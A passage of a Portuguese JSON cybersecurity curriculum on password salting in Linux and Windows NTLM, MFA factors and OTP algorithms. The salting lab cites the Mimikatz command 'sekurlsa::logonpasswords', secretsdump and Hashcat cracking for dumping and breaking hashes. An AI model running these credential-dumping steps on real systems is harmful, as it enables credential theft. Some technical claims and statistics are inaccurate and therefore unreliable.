                                  "stepNumber": 3,
                                  "title": "Analisar Implementação de Salts no Windows (NTLM)",
                                  "subSteps": [
                                    "Extraia hashes NTLM via PowerShell: `Get-LocalUser` ou ferramentas como secretsdump.",
                                    "Entenda NTLM: MD4(UTF16-LE(senha)), sem salt explícito por padrão (falha chave).",
                                    "Compare com NTLMv2: adiciona challenge (não salt fixo), mas ainda vulnerável.",
                                    "Use Mimikatz em VM: `sekurlsa::logonpasswords` para ver hashes LM/NTLM.",
                                    "Documente ausência de per-user salt em NTLM clássico."
                                  ],
                                  "verification": "Relatório comparando hash NTLM extraído, destacando falta de salt único por usuário.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "VM Windows",
                                    "Mimikatz ou PowerShell",
                                    "MS Docs: NTLM overview"
                                  ],
                                  "tips": "Desabilite AV na VM; foque em NTLM vs Kerberos para contexto.",
                                  "learningObjective": "Identificar limitações do NTLM em salting comparado ao Linux.",
                                  "commonMistakes": "Confundir NTLM challenge com salt; testar em host real."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Identificar Boas Práticas e Falhas Comuns",
                                  "subSteps": [
                                    "Liste boas práticas Linux: salt longo/único, SHA-512 lento, rotação.",
                                    "Falhas Windows: NTLM sem salt per-user, fallback LM (sem salt/hash fraco).",
                                    "Compare: Linux melhor por salt randômico; Windows mitiga via políticas (desabilitar NTLM).",
                                    "Teste ataques: rainbow em NTLM vs salted SHA-512 com Hashcat.",
                                    "Recomende: migração para Argon2, salts >=128 bits."
                                  ],
                                  "verification": "Tabela comparativa de 5+ boas práticas e 3+ falhas por OS.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Hashcat para testes",
                                    "Referências: OWASP Password Storage, NIST SP800-63B"
                                  ],
                                  "tips": "Use GPU para Hashcat demos rápidas; quantifique slowdown (ex: milissegundos vs segundos).",
                                  "learningObjective": "Avaliar criticamente implementações reais contra standards.",
                                  "commonMistakes": "Ignorar contextos modernos (ex: Windows Hello); generalizar falhas sem evidência."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Sintetizar Avaliação e Recomendações",
                                  "subSteps": [
                                    "Compile relatório: forças Linux (salts fortes), fraquezas Windows (legacy NTLM).",
                                    "Avalie riscos: ataques offline em dumps de hashes.",
                                    "Proponha auditoria: scripts para checar políticas de hash.",
                                    "Teste verificação: crack time estimado com/ sem salt.",
                                    "Conclua com melhores práticas cross-OS."
                                  ],
                                  "verification": "Relatório final de 1-2 páginas com análise, exemplos e recomendações.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Editor de texto",
                                    "Templates de relatório de segurança"
                                  ],
                                  "tips": "Use markdown para tabelas claras; priorize impacto de falhas.",
                                  "learningObjective": "Formular avaliação holística e acionável.",
                                  "commonMistakes": "Falta de evidências empíricas; recomendações vagas."
                                }
                              ],
                              "practicalExample": "Em uma auditoria pentest, extraia /etc/shadow de um servidor Linux comprometido: identifique $6$ salts longos (boa prática), mas em um DC Windows, hashes NTLM vazios de salt permitem rainbow tables rápidas, levando a escalada de privilégios.",
                              "finalVerifications": [
                                "Explicar formato exato de hash Linux $6$ vs NTLM Windows.",
                                "Identificar pelo menos 3 falhas no NTLM salting.",
                                "Demonstrar crack de hash sem salt vs salted usando Hashcat.",
                                "Listar 4 boas práticas observadas no Linux.",
                                "Propor script para auditoria de políticas de senha em ambos OS.",
                                "Comparar tempos de hash (SHA-512 lento vs MD4 rápido)."
                              ],
                              "assessmentCriteria": [
                                "Precisão técnica: formatos de hash corretos (30%)",
                                "Profundidade de análise: falhas e práticas identificadas (25%)",
                                "Evidências práticas: screenshots/hashes de VMs (20%)",
                                "Recomendações acionáveis e baseadas em standards (15%)",
                                "Clareza e estrutura do relatório (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Criptografia: algoritmos de hash (SHA-512, MD4)",
                                "Sistemas Operacionais: gerenciamento de autenticação (PAM, SAM)",
                                "Redes: protocolos (NTLM vs Kerberos)",
                                "Ética em Cibersegurança: handling de credenciais em pentests"
                              ],
                              "realWorldApplication": "Durante auditorias de conformidade (ex: PCI-DSS), avaliar salting em enterprise Linux/Windows previne breaches como o LinkedIn 2012 (hashes unsalted), permitindo recomendações para migração a PBKDF2/Argon2 e políticas de desabilitação de NTLM."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.1.1.3",
                              "10.1.6.1.2.3"
                            ]
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.6.2",
                    "name": "Autenticação Multifator (MFA)",
                    "description": "Métodos de autenticação que combinam múltiplos fatores, como algo que se sabe, possui ou é.",
                    "individualConcepts": [
                      {
                        "id": "10.1.6.2.1",
                        "name": "Fatores Fundamentais da Autenticação Multifator",
                        "description": "Os componentes básicos da MFA, incluindo os três principais fatores: algo que se sabe (conhecimento, como senhas), algo que se possui (posse, como tokens ou dispositivos) e algo que se é (inerente, como biometria), que combinados elevam o nível de segurança contra acessos não autorizados.",
                        "specificSkills": [
                          {
                            "id": "10.1.6.2.1.1",
                            "name": "Identificar os três fatores principais da MFA",
                            "description": "Reconhecer e diferenciar os fatores de autenticação: conhecimento (senha, PIN), posse (smartcard, app de OTP) e inerentemente (impressão digital, reconhecimento facial), explicando como cada um contribui para a verificação de identidade em sistemas operacionais.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o conceito de Autenticação Multifator (MFA)",
                                  "subSteps": [
                                    "Pesquise a definição de MFA e sua importância na cibersegurança.",
                                    "Identifique por que a autenticação de fator único é insuficiente.",
                                    "Liste os três pilares fundamentais da verificação de identidade.",
                                    "Anote exemplos iniciais de cada fator.",
                                    "Compare MFA com autenticação simples em um diagrama mental."
                                  ],
                                  "verification": "Explique em 2-3 frases o que é MFA e por que usa múltiplos fatores.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Artigo ou vídeo sobre MFA (ex: NIST guidelines)",
                                    "Bloco de notas ou ferramenta de diagrama como Draw.io"
                                  ],
                                  "tips": [
                                    "Use analogias cotidianas, como trancar uma porta com chave e alarme, para fixar o conceito."
                                  ],
                                  "learningObjective": "Entender a base teórica da MFA e a necessidade dos três fatores principais.",
                                  "commonMistakes": [
                                    "Confundir MFA com criptografia de senhas.",
                                    "Achar que MFA é apenas biometria."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar o Fator de Conhecimento",
                                  "subSteps": [
                                    "Defina o fator de conhecimento e dê exemplos como senha ou PIN.",
                                    "Explique como ele verifica identidade baseada em informação secreta.",
                                    "Simule a criação de uma senha forte e teste sua memorização.",
                                    "Discuta vulnerabilidades, como phishing ou adivinhação.",
                                    "Compare com autenticação sem conhecimento."
                                  ],
                                  "verification": "Crie e recite uma senha forte, explicando por que ela representa o fator de conhecimento.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Gerador de senhas online",
                                    "Lista de exemplos de senhas fracas"
                                  ],
                                  "tips": [
                                    "Escolha senhas com pelo menos 12 caracteres, misturando maiúsculas, minúsculas, números e símbolos."
                                  ],
                                  "learningObjective": "Reconhecer o fator de conhecimento e suas contribuições para MFA.",
                                  "commonMistakes": [
                                    "Usar senhas fracas ou reutilizáveis.",
                                    "Confundir com fator de posse."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar o Fator de Posse",
                                  "subSteps": [
                                    "Defina o fator de posse e exemplos como smartcard ou app de OTP.",
                                    "Descreva como ele requer um objeto físico ou digital único.",
                                    "Instale um app de OTP simulado (ex: Google Authenticator demo).",
                                    "Teste geração de código OTP e valide-o.",
                                    "Avalie riscos, como perda do dispositivo."
                                  ],
                                  "verification": "Gere um código OTP e explique como ele prova posse de um dispositivo.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "App de OTP gratuito para teste",
                                    "Smartphone ou emulador"
                                  ],
                                  "tips": [
                                    "Nunca compartilhe o dispositivo de posse; configure backup em outro local seguro."
                                  ],
                                  "learningObjective": "Diferenciar o fator de posse e seu papel na verificação multifator.",
                                  "commonMistakes": [
                                    "Achar que email é fator de posse.",
                                    "Ignorar autenticação de dois fatores como posse."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Estudar o Fator Inerentemente (Biométrico)",
                                  "subSteps": [
                                    "Defina o fator inerentemente com exemplos como impressão digital ou facial.",
                                    "Explique a unicidade biológica e como scanners capturam dados.",
                                    "Pesquise tipos de biometria (voz, íris) e precisão.",
                                    "Simule uso em um dispositivo (ex: desbloqueio de tela).",
                                    "Discuta falsos positivos/negativos e privacidade."
                                  ],
                                  "verification": "Descreva um processo biométrico e liste prós/contras.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Vídeo demo de biometria",
                                    "Dispositivo com sensor biométrico"
                                  ],
                                  "tips": [
                                    "Limpe o sensor antes de usar para maior precisão."
                                  ],
                                  "learningObjective": "Identificar o fator inerentemente e sua contribuição única para MFA.",
                                  "commonMistakes": [
                                    "Confundir biometria com senhas.",
                                    "Subestimar riscos de spoofing."
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Integrar e Diferenciar os Três Fatores",
                                  "subSteps": [
                                    "Crie uma tabela comparando os três fatores: definição, exemplos, forças e fraquezas.",
                                    "Explique como cada um contribui para verificação em SOs.",
                                    "Monte um fluxograma de MFA usando os três fatores.",
                                    "Simule um cenário de login completo com MFA.",
                                    "Reflita sobre como MFA eleva a segurança geral."
                                  ],
                                  "verification": "Apresente a tabela e fluxograma, explicando diferenças e sinergias.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Ferramenta de tabela (Google Sheets)",
                                    "Papel para fluxograma"
                                  ],
                                  "tips": [
                                    "Use cores diferentes para cada fator no fluxograma para visualização clara."
                                  ],
                                  "learningObjective": "Diferenciar os fatores e explicar seu impacto coletivo na identidade.",
                                  "commonMistakes": [
                                    "Misturar exemplos entre fatores.",
                                    "Ignorar que MFA combina pelo menos dois."
                                  ]
                                }
                              ],
                              "practicalExample": "Ao configurar MFA no login do Windows Hello: digite a senha (conhecimento), confirme com app Microsoft Authenticator no celular (posse) e escaneie a impressão digital (inerentemente), garantindo que mesmo se a senha vazar, o acesso é bloqueado sem o dispositivo e biometria.",
                              "finalVerifications": [
                                "Listar corretamente os três fatores: conhecimento, posse e inerentemente.",
                                "Fornecer pelo menos dois exemplos precisos para cada fator.",
                                "Explicar como cada fator contribui independentemente para a verificação de identidade.",
                                "Diferenciar os fatores sem confusões entre eles.",
                                "Desenhar um fluxograma simples de MFA com os três fatores.",
                                "Identificar uma vulnerabilidade por fator e mitigação."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação e nomenclatura dos fatores (100% correto).",
                                "Qualidade e relevância dos exemplos fornecidos (concretos e aplicáveis).",
                                "Clareza e profundidade na explicação das contribuições à MFA.",
                                "Capacidade de diferenciação e comparação entre fatores.",
                                "Criatividade no fluxograma ou tabela integradora.",
                                "Compreensão de aplicações em sistemas operacionais."
                              ],
                              "crossCurricularConnections": [
                                "Biologia: Estudo de biometria e características únicas humanas (impressões digitais, reconhecimento facial).",
                                "Matemática: Criptografia e hashing para senhas no fator de conhecimento.",
                                "Direito: Regulamentações de privacidade de dados (LGPD/GDPR) em autenticação.",
                                "Física: Sensores ópticos e scanners em biometria inerentemente."
                              ],
                              "realWorldApplication": "Em sistemas operacionais como Linux (PAM com MFA) ou macOS, os três fatores previnem acessos não autorizados em ambientes corporativos, bancos online e serviços governamentais, reduzindo riscos de breaches em 99% segundo estudos da Microsoft."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.2.1.2",
                            "name": "Fornecer exemplos práticos de cada fator",
                            "description": "Listar e descrever exemplos reais, como senha + SMS para OTP (conhecimento + posse), ou PIN + biometria (conhecimento + inerentemente), relacionando-os a implementações em SOs como Windows e Linux.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar e Descrever os Três Fatores Fundamentais da MFA",
                                  "subSteps": [
                                    "Pesquise definições oficiais dos fatores: 'algo que você sabe' (conhecimento, ex: senha), 'algo que você tem' (posse, ex: token) e 'algo que você é' (inerente, ex: biometria).",
                                    "Crie um diagrama simples ilustrando cada fator com ícones representativos.",
                                    "Compare os fatores em uma tabela: vantagens, desvantagens e exemplos iniciais.",
                                    "Explique como eles se combinam para MFA (ex: dois ou mais fatores).",
                                    "Registre notas sobre riscos se usado apenas um fator."
                                  ],
                                  "verification": "Crie uma tabela ou lista descrevendo os três fatores com pelo menos um exemplo cada; revise com fonte confiável como NIST SP 800-63.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentação NIST SP 800-63B (online)",
                                    "Papel e caneta ou ferramenta como Draw.io",
                                    "Notebook para notas"
                                  ],
                                  "tips": [
                                    "Use mnemônicos como 'Sabe-Tem-É' para memorizar.",
                                    "Foquem em distinções claras: conhecimento é mental, posse é físico/digital, inerente é biológico."
                                  ],
                                  "learningObjective": "Compreender e diferenciar os três fatores fundamentais da autenticação multifator.",
                                  "commonMistakes": [
                                    "Confundir 'algo que tem' com 'algo que sabe' (ex: PIN é conhecimento, não posse).",
                                    "Ignorar o fator inerente como único e infalível."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Gerar Exemplos Práticos para Cada Fator Individual",
                                  "subSteps": [
                                    "Liste 3 exemplos reais para 'algo que sabe': senha, PIN, resposta de segurança.",
                                    "Liste 3 exemplos para 'algo que tem': SMS OTP, app autenticador (Google Authenticator), chave de segurança hardware (YubiKey).",
                                    "Liste 3 exemplos para 'algo que é': impressão digital, reconhecimento facial, escaneamento de íris.",
                                    "Para cada exemplo, descreva como funciona em 1-2 frases.",
                                    "Teste um exemplo simples: crie uma senha forte e uma resposta de segurança fictícia."
                                  ],
                                  "verification": "Compile uma lista de 9 exemplos (3 por fator) com descrições breves; valide contra implementações reais como em apps bancários.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Sites de referência: OWASP Authentication Cheat Sheet",
                                    "Apps como Google Authenticator para demo",
                                    "Smartphone ou computador para testes"
                                  ],
                                  "tips": [
                                    "Priorize exemplos comuns para facilitar recall.",
                                    "Inclua variações: OTP por SMS vs. TOTP em app."
                                  ],
                                  "learningObjective": "Produzir exemplos concretos e precisos para cada fator fundamental.",
                                  "commonMistakes": [
                                    "Listar biometria como 'algo que tem' em vez de 'algo que é'.",
                                    "Omitir exemplos hardware como YubiKey."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Combinações de Fatores em MFA",
                                  "subSteps": [
                                    "Descreva combinação conhecimento + posse: senha + SMS OTP.",
                                    "Descreva conhecimento + inerente: PIN + impressão digital.",
                                    "Descreva posse + inerente: YubiKey + reconhecimento facial.",
                                    "Crie cenários de uso: 2FA vs. 3FA com exemplos.",
                                    "Discuta por que combinações reduzem riscos (ex: compromisso de um fator não quebra todos)."
                                  ],
                                  "verification": "Desenhe fluxogramas para 3 combinações diferentes; explique verbalmente ou por escrito como cada uma autentica.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Ferramenta de fluxograma como Lucidchart ou papel",
                                    "Vídeos tutoriais YouTube sobre MFA combos",
                                    "Documentação Microsoft sobre Windows Hello"
                                  ],
                                  "tips": [
                                    "Pense em autenticação sequencial vs. simultânea.",
                                    "Use setas em diagramas para mostrar fluxo."
                                  ],
                                  "learningObjective": "Demonstrar como fatores se combinam em cenários MFA reais.",
                                  "commonMistakes": [
                                    "Assumir que PIN é posse (é conhecimento).",
                                    "Ignorar latência em combos com SMS."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Implementações em Sistemas Operacionais Reais",
                                  "subSteps": [
                                    "Pesquise Windows: Windows Hello (PIN + biometria), Microsoft Authenticator para OTP.",
                                    "Pesquise Linux: PAM com Google Authenticator (senha + TOTP), fingerprint com fprintd.",
                                    "Compare configurações: ative MFA em uma VM Windows/Linux se possível.",
                                    "Liste prós/contras de cada SO (ex: Windows mais user-friendly, Linux mais customizável).",
                                    "Documente passos de setup básico para um exemplo por SO."
                                  ],
                                  "verification": "Escreva um relatório curto (200 palavras) com screenshots ou comandos de 2 implementações (uma por SO); teste login simulado.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "VM ou máquina com Windows 10/11",
                                    "Distribuição Linux como Ubuntu",
                                    "Documentação oficial: docs.microsoft.com/windows/security, Ubuntu PAM docs"
                                  ],
                                  "tips": [
                                    "Use VMs para testes seguros sem afetar sistema principal.",
                                    "Comandos Linux chave: apt install libpam-google-authenticator."
                                  ],
                                  "learningObjective": "Relacionar fatores MFA a implementações práticas em Windows e Linux.",
                                  "commonMistakes": [
                                    "Não diferenciar configurações nativas vs. third-party.",
                                    "Esquecer dependências em Linux (ex: instalar pacotes)."
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Sintetizar e Praticar Exemplos Completos",
                                  "subSteps": [
                                    "Compile todos os exemplos em um portfólio: fatores individuais, combos e SOs.",
                                    "Crie 3 quizzes autoaplicados com respostas.",
                                    "Simule ensino: explique para um 'aluno fictício' via gravação ou escrita.",
                                    "Identifique gaps e refine exemplos.",
                                    "Atualize com tendências atuais (ex: passkeys como novo fator)."
                                  ],
                                  "verification": "Apresente portfólio completo; responda quiz com 100% acerto.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Ferramenta de apresentação como Google Slides",
                                    "Gravador de áudio/texto",
                                    "Fontes atualizadas como Krebs on Security blog"
                                  ],
                                  "tips": [
                                    "Mantenha exemplos acionáveis e visuais.",
                                    "Grave-se para autoavaliação."
                                  ],
                                  "learningObjective": "Consolidar conhecimento em exemplos práticos prontos para uso.",
                                  "commonMistakes": [
                                    "Exemplos genéricos sem contexto real.",
                                    "Não praticar verbalização."
                                  ]
                                }
                              ],
                              "practicalExample": "No Windows Hello: Usuário insere PIN ('algo que sabe') seguido de impressão digital ('algo que é'), combinando dois fatores para desbloqueio seguro; similarmente, no Ubuntu Linux com PAM + Google Authenticator: senha + código TOTP de app móvel ('sabe + tem').",
                              "finalVerifications": [
                                "Lista corretamente os três fatores com 3+ exemplos cada.",
                                "Descreve 3 combinações MFA com fluxos precisos.",
                                "Explica implementações em Windows e Linux com passos ou comandos.",
                                "Identifica riscos de fraquezas em exemplos (ex: SMS phishing).",
                                "Cria diagrama ou tabela sintetizando tudo.",
                                "Responde quiz de 10 perguntas com 90%+ acerto."
                              ],
                              "assessmentCriteria": [
                                "Precisão factual: Exemplos alinhados a standards como NIST (peso 30%).",
                                "Profundidade: Subdetalhes em substeps e verificações (25%).",
                                "Praticidade: Exemplos testáveis e relacionáveis a SOs reais (20%).",
                                "Clareza: Títulos, diagramas e linguagem acessível (15%).",
                                "Completude: Todos campos preenchidos, sem gaps (10%)."
                              ],
                              "crossCurricularConnections": [
                                "Criptografia: Geração de OTPs com HMAC (matemática/hash).",
                                "Redes: Protocolos como RADIUS ou OAuth para MFA remoto.",
                                "Desenvolvimento de Software: Implementar MFA em apps com bibliotecas como pyotp.",
                                "Privacidade e Ética: Discussão de biometria vs. dados sensíveis (direito/humano).",
                                "Hardware: Integração com dispositivos IoT para chaves de segurança."
                              ],
                              "realWorldApplication": "Em bancos online (ex: Itaú com senha + app OTP), governos (Gov.br com biometria + token), empresas (Azure AD no Windows para acesso corporativo) e Linux servers (SSH com MFA para admins), prevenindo breaches como roubo de credenciais em 80% dos ataques cibernéticos."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.2.1.3",
                            "name": "Explicar a combinação de fatores para maior segurança",
                            "description": "Analisar como a combinação de pelo menos dois fatores reduz riscos de comprometimento de um único método, usando conceitos de probabilidade de ataque e referências bibliográficas como StallINGS (2017).",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender os Fatores Fundamentais da Autenticação Multifator (MFA)",
                                  "subSteps": [
                                    "Identificar os três principais tipos de fatores: algo que você sabe (senha), algo que você tem (token ou app) e algo que você é (biometria).",
                                    "Explicar como cada fator isolado pode ser comprometido (ex.: phishing para senhas, roubo para tokens, spoofing para biometria).",
                                    "Discutir limitações de autenticação única e introduzir o conceito de MFA como camada adicional.",
                                    "Revisar definições de StallINGS (2017) sobre autenticação.",
                                    "Mapear exemplos reais para cada fator."
                                  ],
                                  "verification": "Criar um diagrama simples listando os três fatores com exemplos de vulnerabilidades para cada um.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Livro 'Cryptography and Network Security' de StallINGS (2017)",
                                    "Diagrama em branco ou ferramenta como Draw.io"
                                  ],
                                  "tips": [
                                    "Use analogias cotidianas, como chaves de casa, para facilitar compreensão.",
                                    "Foque em vulnerabilidades reais para engajar o aluno."
                                  ],
                                  "learningObjective": "Compreender os tipos de fatores MFA e suas fraquezas individuais.",
                                  "commonMistakes": [
                                    "Confundir fatores (ex.: achar que biometria é infalível)",
                                    "Ignorar contexto de StallINGS sobre autenticação."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Probabilidade de Comprometimento em Autenticação Única",
                                  "subSteps": [
                                    "Calcular probabilidade simples de sucesso de ataque em um fator único (ex.: 1% chance de quebra de senha forte).",
                                    "Explicar conceitos probabilísticos: independência de eventos e probabilidade conjunta.",
                                    "Simular cenários com números: se P(ataque senha) = 0.01, impacto em sistemas.",
                                    "Referenciar StallINGS (2017, Capítulo 14) sobre ataques a autenticação.",
                                    "Discutir métricas como taxa de sucesso de phishing (dados NIST)."
                                  ],
                                  "verification": "Resolver um exercício: calcular probabilidade de falha em autenticação única dado P=0.05.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Calculadora ou planilha Excel",
                                    "Capítulo 14 de StallINGS (2017)",
                                    "Dados NIST sobre phishing"
                                  ],
                                  "tips": [
                                    "Use probabilidades reais de relatórios como Verizon DBIR para credibilidade.",
                                    "Evite fórmulas complexas; foque em intuitivo."
                                  ],
                                  "learningObjective": "Aplicar conceitos de probabilidade a riscos de autenticação única.",
                                  "commonMistakes": [
                                    "Assumir dependência entre ataques",
                                    "Usar probabilidades irreais sem fontes."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explicar Redução de Riscos pela Combinação de Fatores",
                                  "subSteps": [
                                    "Demonstrar probabilidade conjunta: P(ambos fatores) = P1 * P2 se independentes (ex.: 0.01 * 0.01 = 0.0001).",
                                    "Analisar cenários: dois fatores vs. um; impacto em superfície de ataque.",
                                    "Discutir ataques avançados como man-in-the-middle e como MFA mitiga.",
                                    "Referenciar StallINGS (2017) sobre multi-fator e defesa em profundidade.",
                                    "Comparar gráficos: risco único vs. combinado."
                                  ],
                                  "verification": "Produzir tabela comparativa de probabilidades para 1, 2 e 3 fatores.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Planilha para cálculos probabilísticos",
                                    "Gráficos de StallINGS (2017)",
                                    "Ferramenta de gráficos como Google Sheets"
                                  ],
                                  "tips": [
                                    "Visualize com gráficos exponenciais para mostrar redução drástica.",
                                    "Inclua exemplos de breaches reais mitigados por MFA."
                                  ],
                                  "learningObjective": "Quantificar como combinação reduz riscos usando probabilidade.",
                                  "commonMistakes": [
                                    "Ignorar independência de fatores",
                                    "Subestimar ataques correlacionados."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Sintetizar Benefícios e Referências Bibliográficas",
                                  "subSteps": [
                                    "Resumir: combinação ≥2 fatores reduz risco exponencialmente.",
                                    "Citar StallINGS (2017) explicitamente: 'MFA aumenta entropia efetiva'.",
                                    "Discutir trade-offs: usabilidade vs. segurança.",
                                    "Preparar argumentos para defesa em profundidade.",
                                    "Testar conhecimento com Q&A rápida."
                                  ],
                                  "verification": "Escrever parágrafo explicativo citando StallINGS e probabilidade.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Cópia de StallINGS (2017)",
                                    "Folha para resumo"
                                  ],
                                  "tips": [
                                    "Sempre cite fontes para acadêmico.",
                                    "Conecte a conceitos NIST SP 800-63."
                                  ],
                                  "learningObjective": "Integrar análise com referências para explicação completa.",
                                  "commonMistakes": [
                                    "Não citar fontes corretamente",
                                    "Exagerar benefícios sem dados."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um banco online, usar senha (sabe) + app autenticador (tem): um atacante precisa phishar senha E roubar/clonar app simultaneamente, reduzindo chance de 5% para 0.0025% (probabilidade conjunta).",
                              "finalVerifications": [
                                "Explicar corretamente os três fatores MFA com exemplos.",
                                "Calcular probabilidade conjunta para dois fatores independentes.",
                                "Citar StallINGS (2017) com referência precisa ao conceito.",
                                "Comparar riscos: autenticação única vs. MFA em tabela.",
                                "Identificar pelo menos dois ataques mitigados por MFA.",
                                "Argumentar defesa em profundidade com MFA."
                              ],
                              "assessmentCriteria": [
                                "Precisão na explicação de fatores e probabilidades (30%)",
                                "Uso correto de conceitos matemáticos e citações (25%)",
                                "Clareza na redução de riscos com exemplos (20%)",
                                "Referências bibliográficas adequadas (15%)",
                                "Profundidade de análise e trade-offs (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Probabilidade e estatística (cálculos conjuntos).",
                                "Estatística: Análise de riscos e dados de breaches (NIST).",
                                "Física/Engenharia: Biometria e hardware tokens.",
                                "Ética: Privacidade em autenticação (GDPR conexões)."
                              ],
                              "realWorldApplication": "Em empresas como Google ou Microsoft, MFA reduziu acessos não autorizados em 99%, conforme relatórios de segurança; essencial para compliance com NIST e proteção contra ransomware."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.6.2.2",
                        "name": "Mecanismos e Tecnologias de MFA",
                        "description": "Diferentes métodos tecnológicos para implementar MFA, incluindo senhas de uso único (OTP), tokens hardware, autenticação biométrica e push notifications, com foco em integração com sistemas operacionais.",
                        "specificSkills": [
                          {
                            "id": "10.1.6.2.2.1",
                            "name": "Descrever autenticação com senhas de uso único (OTP)",
                            "description": "Explicar o funcionamento de OTP via apps como Google Authenticator ou SMS, incluindo geração baseada em tempo (TOTP) ou HMAC (HOTP), e sua aplicação em logins de SOs.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Conceitos Fundamentais de Senhas de Uso Único (OTP)",
                                  "subSteps": [
                                    "Defina OTP como uma senha temporária gerada para um único uso em autenticação.",
                                    "Explique a diferença entre autenticação de uso único e senhas estáticas tradicionais.",
                                    "Identifique os principais tipos: HOTP (baseado em contador HMAC) e TOTP (baseado em tempo).",
                                    "Discuta vantagens de OTP em cenários de MFA, como resistência a phishing.",
                                    "Revise componentes chave: chave secreta compartilhada, algoritmo HMAC-SHA1 e seed."
                                  ],
                                  "verification": "Resuma em 3 frases o que é OTP, seus tipos e vantagens; compare com senhas fixas.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "RFC 4226 (HOTP)",
                                    "RFC 6238 (TOTP)",
                                    "Vídeo introdutório sobre MFA no YouTube"
                                  ],
                                  "tips": "Use diagramas para visualizar o fluxo de geração de OTP; memorize HMAC como base comum.",
                                  "learningObjective": "Explicar o conceito de OTP e seus tipos principais com precisão.",
                                  "commonMistakes": [
                                    "Confundir OTP com tokens estáticos",
                                    "Ignorar a necessidade de sincronização entre cliente e servidor"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar o Funcionamento do HOTP (HMAC-based One-Time Password)",
                                  "subSteps": [
                                    "Descreva HOTP como f(C) = Truncate(HMAC-SHA1(K, C)), onde K é chave secreta e C é contador.",
                                    "Explique o papel do contador incremental para cada uso, evitando reutilização.",
                                    "Discuta desafios de sincronização de contadores entre cliente e servidor (janelas de tolerância).",
                                    "Simule manualmente um cálculo HOTP com ferramentas online como hotp-generator.",
                                    "Analise uso comum via SMS ou hardware tokens."
                                  ],
                                  "verification": "Calcule um OTP HOTP exemplo com contador 5 e chave '123456' usando calculadora online.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Calculadora HOTP online (ex: cyberchef)",
                                    "Documentação IETF RFC 4226"
                                  ],
                                  "tips": "Teste com contadores desalinhados para entender janelas de validação (tipicamente 100-1000).",
                                  "learningObjective": "Descrever o algoritmo HOTP e simular sua geração.",
                                  "commonMistakes": [
                                    "Esquecer truncamento para 6-8 dígitos",
                                    "Não considerar drift de contador em implantações reais"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar o Funcionamento do TOTP (Time-based One-Time Password)",
                                  "subSteps": [
                                    "Defina TOTP como HOTP onde contador C = floor((Tnow - T0)/X), com Tnow atual e X=30s.",
                                    "Explique geração via apps como Google Authenticator usando QR code para compartilhar chave K.",
                                    "Descreva ciclo de 30 segundos e tolerância de tempo (ex: ±1 intervalo).",
                                    "Instale e configure Google Authenticator com um site de teste (ex: totp.danhersam.com).",
                                    "Compare TOTP vs HOTP: tempo vs contador."
                                  ],
                                  "verification": "Gere um TOTP no app e valide em um validador online; anote o código gerado.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "App Google Authenticator ou Authy",
                                    "Site de teste TOTP (totp.danhersam.com)"
                                  ],
                                  "tips": "Sincronize relógio do dispositivo para evitar erros de tempo; use QR para setup rápido.",
                                  "learningObjective": "Implementar e explicar geração TOTP em apps reais.",
                                  "commonMistakes": [
                                    "Relógio dessincronizado causando invalidação",
